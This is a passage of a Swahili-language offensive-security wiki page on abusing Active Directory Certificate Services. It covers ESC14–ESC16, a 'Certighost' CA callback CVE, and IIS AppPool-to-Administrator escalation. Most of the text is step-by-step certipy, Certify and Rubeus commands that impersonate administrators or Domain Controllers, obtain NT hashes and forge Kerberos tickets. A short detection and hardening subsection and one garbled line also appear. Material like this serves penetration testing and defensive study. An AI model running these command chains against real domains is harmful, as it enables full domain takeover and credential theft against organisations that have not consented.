- **Sharti la awali**: Lengwa lina explicit mapping dhaifu ya X509IssuerSubject katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye principal ya mwathiriwa ili ilingane na subject ya mapping ya X509IssuerSubject ya lengwa. Kisha mshambuliaji anaweza ku-enroll cheti kama mwathiriwa, na kutumia cheti hicho kujithibitisha kama lengwa.
#### Hali D: Lengwa Lina Mapping ya X509SubjectOnly

- **Sharti la awali**: Lengwa lina explicit mapping dhaifu ya X509SubjectOnly katika `altSecurityIdentities`. Mshambuliaji anaweza kuweka attribute ya `cn` au `dNSHostName` kwenye principal ya mwathiriwa ili ilingane na subject ya mapping ya X509SubjectOnly ya lengwa. Kisha mshambuliaji anaweza ku-enroll cheti kama mwathiriwa, na kutumia cheti hicho kujithibitisha kama lengwa.
### Shughuli halisi
#### Hali A

Omba cheti cha template ya cheti `Machine`

```bash
.\Certify.exe request /ca:<ca> /template:Machine /machine
```

 Hifadhi na ubadilishe cheti

```bash
certutil -MergePFX .\esc13.pem .\esc13.pfx
```

 Thibitisha utambulisho (kwa kutumia cheti)

```bash
.\Rubeus.exe asktgt /user:<user> /certificate:C:\esc13.pfx /nowrap
```

Usafishaji (hiari)

```bash
Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,DC=local" -MappingString "X509:<I>DC=local,DC=external,CN=external-EXTCA01-CA<SR>250000000000a5e838c6db04f959250000006c"
```

Kwa mbinu mahususi zaidi za mashambulizi katika hali mbalimbali za mashambulizi, tafadhali rejelea: [adcs-esc14-abuse-technique](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9#aca0).<sup>[[13]](#references)</sup>

## EKUwu Application Policies(CVE-2024-49019) - ESC15

### Maelezo

Utafiti wa [awali kuhusu ESC15](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc) unaeleza jinsi application policies zinazotolewa kwenye ombi la template ya V1 zinavyoweza kuchukua nafasi ya Extended Key Usage iliyosanidiwa kwenye **issuing CA ambayo haijawekewa kiraka**.<sup>[[15]](#references)</sup> Pia, mhusika anayechunguzwa anahitaji template iliyochapishwa na inayoruhusu enrollment, ambayo inaruhusu sifa zinazohitajika za subject/request na haina kizuizi cha approval au signature. Haki za enrollment pekee hazithibitishi kuwa shambulio linawezekana. Matumizi ya Certificate Request Agent yanaweza pia kutegemea template ya pili inayofaa na vizuizi vya enrollment-agent; thibitisha hali ya kiraka cha CA na matokeo ya utoaji wa cheti kabla ya kudai kuwa njia hiyo inafanya kazi.

### Matumizi mabaya

Nyaraka za [Certipy za kupandisha mamlaka](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) zina mifano ya kina zaidi ya matumizi.<sup>[[14]](#references)</sup>


Amri ya `find` ya Certipy inaweza kusaidia kutambua templates za V1 ambazo huenda ziko hatarini kwa ESC15 ikiwa CA haijawekewa kiraka.

```bash
certipy find -username cccc@aaa.htb -password aaaaaa -dc-ip 10.0.0.100
```

#### Hali A: Kujiwakilisha Moja kwa Moja kupitia Schannel

**Hatua ya 1: Omba certificate, ukiingiza "Client Authentication" Application Policy na UPN ya mlengwa.** Mshambuliaji `attacker@corp.local` anamlenge `administrator@corp.local` kwa kutumia template ya "WebServer" V1 (inayoruhusu subject iliyotolewa na mwombaji).

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -upn 'administrator@corp.local' -sid 'S-1-5-21-...-500' \
    -application-policies 'Client Authentication'
```

- `-template 'WebServer'`: Template ya V1 iliyo hatarini yenye "Enrollee supplies subject".
- `-application-policies 'Client Authentication'`: Huongeza OID `1.3.6.1.5.5.7.3.2` kwenye kiendelezi cha Application Policies cha CSR.
- `-upn 'administrator@corp.local'`: Huweka UPN kwenye SAN kwa ajili ya kujifanya mtumiaji mwingine.

**Hatua ya 2: Thibitisha utambulisho kupitia Schannel (LDAPS) kwa kutumia cheti kilichopatikana.**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100' -ldap-shell
```

#### Hali B: PKINIT/Kerberos Impersonation kupitia Unyonyaji wa Enrollment Agent

**Hatua ya 1: Omba certificate kutoka kwenye V1 template (iliyo na "Enrollee supplies subject"), ukiingiza Application Policy ya "Certificate Request Agent".** Certificate hii ni ya mshambuliaji (`attacker@corp.local`) ili awe enrollment agent. Hakuna UPN iliyobainishwa kwa utambulisho wa mshambuliaji mwenyewe hapa, kwa kuwa lengo ni kupata uwezo wa agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
```

- `-application-policies 'Certificate Request Agent'`: Huingiza OID `1.3.6.1.4.1.311.20.2.1`.

**Hatua ya 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji lengwa mwenye upendeleo.** Hii ni hatua inayofanana na ESC3, inayotumia cheti kutoka Hatua ya 1 kama cheti cha agent.

```bash
certipy req \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
    -ca 'CORP-CA' -template 'User' \
    -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
```

**Hatua ya 3: Thibitisha utambulisho wako kama mtumiaji mwenye upendeleo ukitumia cheti cha "on-behalf-of".**

```bash
certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
```

## Security Extension Imezimwa kwenye CA (Kote)-ESC16

### Maelezo

**ESC16 (Kupandisha Haki kwa Kukosekana kwa Kiendelezi cha szOID_NTDS_CA_SECURITY_EXT)** hueleza kuzimwa kwa kiendelezi cha SID **szOID_NTDS_CA_SECURITY_EXT** katika CA nzima. Hiki ni kiashirio cha usanidi, si uthibitisho kwamba cheti kinaweza kuthibitisha utambulisho kama akaunti nyingine. Kuiga utambulisho pia kunahitaji udhibiti wa sifa au ulinganishaji wa akaunti husika, template ya uthibitishaji wa mteja inayoweza kuombwa, na njia ya ulinganishaji wa cheti inayokubaliwa na domain controller au huduma halisi. KDC iliyowekewa viraka katika Full Enforcement hukataa vyeti visivyo na kiendelezi cha SID isipokuwa viwe na ulinganishaji mwingine thabiti; utaratibu wa Kerberos wa UPN-only ulio hapa chini unatumika kwa KDC za zamani au za hali ya uoanifu ambazo bado zinakubali ulinganishaji dhaifu. Tazama [mwongozo wa Microsoft kuhusu ulinganishaji wa vyeti na utekelezaji](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Unaweza pia kurejelea makala haya ili kujifunza zaidi kuhusu kanuni hiyo kwa undani:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6<sup>[[16]](#references)</sup>

### Matumizi Mabaya

Mfano ufuatao wa kihistoria wa Kerberos wa UPN-only unatokana na [nyaraka za ESC16 za Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Unahitaji KDC ambayo bado inakubali ulinganishaji dhaifu unaotokana na matokeo hayo; `StrongCertificateBindingEnforcement=1` si tena njia ya kubatilisha inayoungwa mkono baada ya sasisho la usalama la Windows la Septemba 9, 2025.<sup>[[14]](#references)</sup>

Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yana udhaifu wa **ESC16**】【。

```bash
certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
```

**Hatua ya 1: Soma UPN ya awali ya akaunti ya mwathiriwa (Si lazima - kwa ajili ya kurejesha).**  


```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -user 'victim' \
    read
```

**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiriwa iwe `sAMAccountName` ya msimamizi lengwa.  

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'administrator' \
    -user 'victim' update
```

**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "mwathiriwa" (kwa mfano, kupitia Shadow Credentials).**

```shell
certipy shadow \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -account 'victim' \
    auto
```

**Hatua ya 4: Omba cheti kama mtumiaji "victim" kutoka kwenye template ya client-authentication ambayo akaunti inaweza kujiandikisha (kwa mfano, "User") kwenye CA iliyosanidiwa kwa ESC16.** CA huondoa SID security extension kwenye cheti kinachotolewa, lakini hilo pekee halithibitishi kuwa kuna authentication mapping inayoweza kutumika. Weka kigezo cha mazingira cha Kerberos credential cache (amri ya shell):

```bash
export KRB5CCNAME=victim.ccache
```

Kisha omba certificate:

```bash
certipy req \
    -k -dc-ip '10.0.0.100' \
    -target 'CA.CORP.LOCAL' -ca 'CORP-CA' \
    -template 'User'
```

**Hatua ya 5: Rejesha UPN ya akaunti ya "victim".**

```bash
certipy account \
    -u 'attacker@corp.local' -p 'Passw0rd!' \
    -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
    -user 'victim' update
```

**Hatua ya 6: Kwenye KDC ya zamani au iliyo katika hali ya uoanifu inayokubali ulinganishaji huu dhaifu, thibitisha utambulisho wako kama msimamizi lengwa.**

```bash
certipy auth \
    -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
    -username 'administrator' -domain 'corp.local'
```

## Rogue LDAP/LSA chase callback: ubadilishaji wa utambulisho (Certighost / CVE-2026-54121)

### Maelezo

**Certighost** hutumia vibaya **njia ya AD CS enrollment chase / callback** ambapo CA huamini request attributes zilizotolewa na requester ili kubaini utambulisho unaopaswa kuwekwa kwenye certificate inayotolewa. Kwenye PoC ya umma, request iliyoundwa mahususi inajumuisha:<sup>[[1]](#references)[[2]](#references)</sup>

- **`cdc`**: host/IP inayodhibitiwa na mshambuliaji ambayo CA itawasiliana nayo
- **`rmd`**: **jina la DNS la Domain Controller lengwa** la kuiga

CA ikifuata chase hiyo, itaunganishwa na mshambuliaji kupitia **SMB/LSA (`445`)** na **LDAP (`389`)**. Mshambuliaji hutumia **machine account halisi** (kwa kawaida huundwa kupitia **`ms-DS-MachineAccountQuota`** chaguomsingi) ili callback session ithibitishe utambulisho kama domain principal halali, lakini rogue services zirudishe badala yake sifa za utambulisho za **DC lengwa**:

- `sAMAccountName`
- `objectSid` / SID
- `dNSHostName`

Ikiwa CA **haitafungi kwa njia ya kriptografia utambulisho uliorejeshwa na callback na principal iliyothibitishwa**, inaweza kutoa certificate ya **Domain Controller** ingawa session ilithibitisha utambulisho kama machine account inayodhibitiwa na mshambuliaji. Hii inafanya bug hii kuwa tofauti kimawazo na **Certifried**: badala ya kuandika upya sifa za AD kama `dNSHostName`, mshambuliaji **hubadilisha data ya utambulisho wakati wa utatuzi wa CA callback**.<sup>[[2]](#references)</sup>

**Masharti muhimu ya awali:**

- **domain credentials** zenye upendeleo mdogo
- Uwezo wa **kuunda au kutumia tena computer account**
- Muunganisho wa mtandao kutoka kwa **CA** hadi **ports `389` na `445`** zinazodhibitiwa na mshambuliaji
- Njia ya CA request iliyo hatarini / isiyowekewa patch (update ya Microsoft ya **Julai 14, 2026** iliongeza **uthibitishaji wa DC kwa `cdc`** pamoja na **ulinganisho wa SID iliyotatuliwa**)

**`.pfx`** inayopatikana inaweza kutumiwa kwa **PKINIT**, na hivyo kutengeneza **`.ccache`** na, katika mtiririko wa PoC iliyochapishwa, **NT hash ya DC lengwa**; kwa kawaida hii inatosha kusababisha **domain compromise kamili**.

### Matumizi mabaya

PoC ya umma huendesha mnyororo mzima kiotomatiki:<sup>[[1]](#references)</sup>

1. Unda au tumia tena **machine account** inayodhibitiwa na mshambuliaji.
2. Anzisha **rogue LDAP na SMB/LSA listeners** kwenye `389` na `445`.
3. Wasilisha certificate request iliyo na sifa za **`cdc`** zinazodhibitiwa na mshambuliaji na sifa za **`rmd`** za lengo.
4. Ruhusu CA ithibitishe utambulisho kwa rogue listeners kama machine account inayodhibitiwa, lakini ijibu maombi ya utambulisho kwa sifa za **DC lengwa**.
5. Pokea **DC certificate** iliyosainiwa na CA, kisha uitumie kwa **PKINIT**.

```bash
sudo python3 certighost.py -d playground.local -u lowpriv -p 'Password1234' --dc-ip 192.168.1.10
```

Bendera za runtime zinazofaa kutoka kwenye PoC:

- `--listener <ip>`: chagua wazi IP ya callback itakayotangazwa kwenye `cdc`
- `--computer-name <NAME$>`: tumia tena akaunti ya mashine iliyopo badala ya kuunda mpya

**Vidokezo vya kiutendaji:**

- PoC inahitaji **root** kwa sababu hufunga **privileged ports** `389` na `445`.
- Exploitation ikifaulu, huhifadhi **DC `.pfx`** na **Kerberos `.ccache`** ndani ya kifaa.
- Kwa kuwa certificate inahusishwa na akaunti ya **Domain Controller**, hatua zinazofuata zinaweza kujumuisha **certificate-based Kerberos auth**, **DCSync**, na kutumia tena **machine NT hash** iliyopatikana.<sup>[[2]](#references)</sup>

## Usajili wa mashine wa IIS AppPool hadi Administrator wa host hiyo hiyo

IIS pool inayoendeshwa kama `ApplicationPoolIdentity` hutumia **computer account** ya host yake kufikia rasilimali za mtandao. Kwa hiyo, code execution kama `IIS AppPool\<POOL>` hubaki na ruhusa za chini kwenye local token, lakini inaweza kuwasilisha ombi la AD CS ambalo CA hulithibitisha kama `HOST$`; huu ni mabadiliko ya utambulisho wa kutoka, si token impersonation au local elevation ya aina ya Potato.<sup>[[19]](#references)[[20]](#references)</sup>

Mlolongo huu unahitaji host ya IIS iliyounganishwa kwenye domain, Enterprise CA inayofikika kupitia RPC, template ya uthibitishaji wa mashine iliyochapishwa ambayo kompyuta ina ruhusa za kujiandikisha kwayo, usaidizi wa PKINIT, na ufikikaji wa KDC/SMB. Utambulisho maalum wa pool hubadilisha principal wa kutoka, kwa hiyo hakikisha pool inatumia `ApplicationPoolIdentity` kabla ya kudhani kuwa ni `HOST$`.<sup>[[19]](#references)[[20]](#references)</sup>

### Usajili kwa kutumia key inayodhibitiwa na mshambuliaji

Tengeneza key pair na CSR mbali na seva ya IIS, kisha hifadhi private key. Tuma **CSR pekee** kutoka kwenye worker iliyoathiriwa. [Certi-Bhai ASPX PoC](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx) huunda `CertificateAuthority.Request`, huweka `CertificateTemplate:Machine`, huita `ICertRequest::Submit`, na kurudisha certificate iliyotolewa. Tumia CA configuration string `CAHOST\CA-NAME`; template ya kawaida ya `Machine` huunda subject kutoka AD, kwa hiyo data ya subject/SAN iliyotolewa na mwombaji haihitajiki.<sup>[[18]](#references)[[19]](#references)[[21]](#references)</sup>

Unganisha certificate iliyorejeshwa na key inayolingana uliyohifadhi. `certutil -MergePFX machine_cert.cer machine_cert.pfx` hufanya kazi tu ikiwa Windows inaweza tayari kuhusisha certificate na private key inayofikika; kwa mafaili tofauti ya PEM, unda PKCS#12 waziwazi:<sup>[[19]](#references)[[23]](#references)</sup>

```bash
openssl pkcs12 -export -in machine_cert.cer -inkey machine_cert.key \
  -out machine_cert.pfx -name 'HOST$'
```

Tumia PFX kwa PKINIT na uhifadhi TGT ya kompyuta iliyorejeshwa katika mfumo wa base64 badala ya kuiingiza mara moja:<sup>[[5]](#references)[[19]](#references)</sup>

```powershell
Rubeus.exe asktgt /user:HOST$ /domain:DOMAIN /certificate:machine_cert.pfx `
  /password:PFX_PASSWORD /nowrap
```

### S4U2Self plus same-host service substitution

S4U2Self huwezesha service kupata ticket **kwa ajili yake yenyewe** yenye data ya uidhinishaji ya user mwingine. Kwa kutumia computer TGT, Rubeus inaweza kuomba ticket hiyo kwa user mwenye upendeleo, kubadilisha jina la service katika KRB-CRED iliyorejeshwa kuwa CIFS, na kuiingiza. Hii ndiyo primitive ya ndani ya “delegate to thyself”: haihitaji S4U2Proxy wala entry ya `msDS-AllowedToDelegateTo`.<sup>[[5]](#references)[[17]](#references)[[22]](#references)</sup>

```powershell
Rubeus.exe s4u /self /impersonateuser:Administrator `
  /altservice:cifs/HOST.DOMAIN /ticket:BASE64_MACHINE_TGT /ptt /nowrap

klist
dir \\HOST.DOMAIN\C$
```

Tiketi iliyobadilishwa inaweza kutumiwa tu na huduma zilizo kwenye **akaunti/ufunguo uleule wa kompyuta** (hapa, CIFS kwenye `HOST`). Si tiketi ya Administrator inayoweza kutumiwa tena kwenye mashine nyingine za domain. Pia, matokeo yaliyoonyeshwa ni ufikiaji wa SMB/filesystem wenye upendeleo kama Administrator; kupata mchakato wa ndani wa `NT AUTHORITY\SYSTEM` bado kunahitaji hatua tofauti ya utekelezaji wa mbali.<sup>[[5]](#references)[[17]](#references)[[19]](#references)</sup>

### Utambuzi na uimarishaji wa usalama

- Kwenye CA, linganisha matukio ya Certification Services **4886** (ombi limepokelewa) na **4887** (limetolewa) ili kubaini maombi yasiyo ya kawaida ya template ya `Machine` kutoka kwa akaunti za seva za IIS.<sup>[[19]](#references)[[24]](#references)</sup>
- Kwenye DCs, tukio **4768** hujumuisha sehemu za cheti wakati pre-authentication ya cheti inatumiwa; toa tahadhari kuhusu maombi yasiyo ya kawaida ya PKINIT TGT kwa akaunti za web-server. Kisha fuatilia maombi ya **4769** yanayohusisha utambulisho wa upendeleo ulioigizwa na host ileile. Kwa kuwa Rubeus `/altservice` hubadilisha jina la huduma la KRB-CRED upande wa client, usihitaji jina la huduma kwenye 4769 ya upande wa DC liwe `cifs`.<sup>[[5]](#references)[[25]](#references)[[26]](#references)</sup>
- Tafuta `w3wp.exe` ikiwasiliana na endpoints za CA RPC, uundaji usiotarajiwa wa ASPX, ufikiaji wa administrative shares uliothibitishwa kwa Kerberos, na shughuli za kuiba secrets. Ikiwezekana, zuia ufikiaji wa app-tier kwa CA RPC/KDC/SMB na uondoe ruhusa za usajili wa kompyuta au templates za uthibitishaji wa mashine ambazo hazihitajiki kiutendaji.<sup>[[19]](#references)</sup>

## Kuelewa Uvunjaji wa Forest kwa Vyeti kwa Kutumia Usemi wa Kutendewa

### Kuvunjwa kwa Trust za Forest na CA Zilizodukuliwa

Usanidi wa **usajili katika forest mbalimbali** umefanywa kuwa rahisi kiasi. Cheti cha **root CA** kutoka resource forest **huchapishwa kwenye account forests** na wasimamizi, na vyeti vya **enterprise CA** kutoka resource forest **huongezwa kwenye kontena za `NTAuthCertificates` na AIA katika kila account forest**. Kwa ufafanuzi, mpangilio huu huipa **CA katika resource forest udhibiti kamili** juu ya forest nyingine zote ambazo inasimamia PKI. Iwapo CA hii **itadukuliwa na washambuliaji**, wanaweza **kughushi** vyeti vya watumiaji wote katika resource forest na account forests, na hivyo kuvunja mpaka wa usalama wa forest.<sup>[[6]](#references)</sup>

### Ruhusa za Usajili Zinazotolewa kwa Principals wa Kigeni

Katika mazingira yenye forest nyingi, tahadhari inahitajika kuhusu Enterprise CAs zinazochapisha **certificate templates** zinazoruhusu **Authenticated Users au foreign principals** (watumiaji/makundi kutoka nje ya forest ambayo Enterprise CA ni ya kwake) **ruhusa za usajili na uhariri**.\
Mtumiaji anapothibitishwa kupitia trust, AD huongeza **Authenticated Users SID** kwenye token yake. Kwa hiyo, ikiwa domain ina Enterprise CA yenye template **inayoruhusu Authenticated Users kuwa na ruhusa za usajili**, mtumiaji kutoka forest nyingine anaweza kuisajili template hiyo. Vilevile, ikiwa template **inatoa ruhusa za usajili moja kwa moja kwa foreign principal**, basi **uhusiano wa udhibiti wa ufikiaji wa forest mbalimbali huundwa**, na kumwezesha principal kutoka forest moja **kusajili template kutoka forest nyingine**.

Hali zote mbili husababisha **kuongezeka kwa eneo la mashambulizi** kutoka forest moja hadi nyingine. Mshambuliaji anaweza kutumia mipangilio ya certificate template kupata ruhusa za ziada katika domain ya kigeni.<sup>[[6]](#references)</sup>


## References

- [1] [aniqfakhrul/CVE-2026-54121 Hazina ya PoC](https://github.com/aniqfakhrul/CVE-2026-54121)
- [2] [H0j3n - Uchambuzi wa kiufundi wa Certighost](https://gist.github.com/H0j3n/a5ef2609b5f2944ac2390a191a534c26)
- [3] [Certify 2.0 – Blogu ya SpecterOps](https://specterops.io/blog/2025/08/11/certify-2-0/)
- [4] [GhostPack/Certify](https://github.com/GhostPack/Certify)
- [5] [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus)
- [6] [SpecterOps – Certified Pre-Owned: Kutumia vibaya Active Directory Certificate Services](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [7] [Oliver Lyak – Certipy 4.0: ESC9, ESC10, BloodHound GUI, Mbinu mpya za Uthibitishaji na Maombi, na mengineyo](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [8] [SpecterOps – Shadow Credentials: Kutumia vibaya Ramani ya Akaunti ya Key Trust kwa ajili ya Kuchukua Udhibiti wa Akaunti](https://specterops.io/blog/2021/06/17/shadow-credentials-abusing-key-trust-account-mapping-for-account-takeover/)
- [9] [CQure Academy – Hadithi ya Matumizi (Mabaya) ya Enhanced Key](https://cqureacademy.com/blog/enhanced-key-usage)
- [10] [Compass Security – Kuelekeza Relay kwa AD Certificate Services kupitia RPC](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
- [11] [hajo – ESC12: Ufikiaji wa shell kwa ADCS CA yenye YubiHSM](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm)
- [12] [SpecterOps – Mbinu ya Kutumia vibaya ADCS ESC13](https://specterops.io/blog/2024/02/14/adcs-esc13-abuse-technique/)
- [13] [SpecterOps – Mbinu ya Kutumia vibaya ADCS ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [14] [Certipy Wiki – Kupandisha Ruhusa (ESC1-ESC17)](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
- [15] [TrustedSec – EKUwu: Si ESC nyingine tu ya AD CS](https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc)
- [16] [Furious5 – AD CS ESC16: Usanidi Usio Sahihi na Unyonyaji](https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6)
- [17] [Charlie Clark – Kupitia upya “Delegate 2 Thyself”](https://exploit.ph/revisiting-delegate-2-thyself.html)
- [18] [incredibleindishell/Certi-Bhai – PoC ya usajili wa IIS AD CS](https://github.com/incredibleindishell/Certi-Bhai/blob/main/IIS_Privilege_escalation/cert.aspx)
- [19] [Mannu Linux – Kupandisha Ruhusa kutoka IIS AppPool kupitia AD CS RPC Endpoint](https://mannulinux.org/2026/08/Privilege-escalation-from-IIS-AppPool-to-NT-AuthoritySYSTEM-via-AD-CS-RPC-endpoint.html)
- [20] [Microsoft – Utambulisho wa Application Pool](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities)
- [21] [Microsoft – ICertRequest::Submit](https://learn.microsoft.com/en-us/windows/win32/api/certcli/nf-certcli-icertrequest-submit)
- [22] [Microsoft Open Specifications – S4U2self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13)
- [23] [OpenSSL – amri ya pkcs12](https://docs.openssl.org/3.6/man1/openssl-pkcs12/)
- [24] [Microsoft – Kukagua Certification Services](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/audit-certification-services)
- [25] [Microsoft – Tukio la 4768: Tiketi ya uthibitishaji ya Kerberos iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [26] [Microsoft – Tukio la 4769: Tiketi ya huduma ya Kerberos iliombwa](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769)
- [27] [incredibleindishell/Certi-Bhai – Zana ya kutumia vibaya AD CS kwa PowerShell](https://github.com/incredibleindishell/Certi-Bhai)
{{#include ../../../banners/hacktricks-training.md}}
